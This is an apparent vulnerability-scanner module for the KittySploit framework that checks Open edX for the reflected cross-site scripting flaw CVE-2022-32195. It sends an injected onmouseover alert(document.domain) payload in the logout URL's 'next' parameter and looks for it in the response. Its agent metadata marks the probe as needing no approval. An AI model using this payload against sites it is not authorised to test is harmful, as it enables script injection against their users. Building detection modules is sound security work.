#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Open edX before 2022-06-06 contains a reflected cross-site scripting vulnerability via the 'next' parameter in."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Open edX <2022-06-06 - Cross-Site Scripting Detection',
        'description': "Open edX before 2022-06-06 contains a reflected cross-site scripting vulnerability via the 'next' parameter in the logout URL.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'openedx', 'xss', 'edx', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://discuss.openedx.org/t/security-patch-for-logout-page-xss-vulnerability/7408',
            'https://github.com/edx',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-32195',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-32195',
    }

    def run(self):
        r = self.http_request(method="GET", path='/logout?next=%208%22onmouseover=%22alert(document.domain)', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<a href="+8"onmouseover="alert(document.domain)">click here to go to',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Open edX <2022-06-06 - Cross-Site Scripting detected",
                path='/logout?next=%208%22onmouseover=%22alert(document.domain)',
            )
            return True
        return False

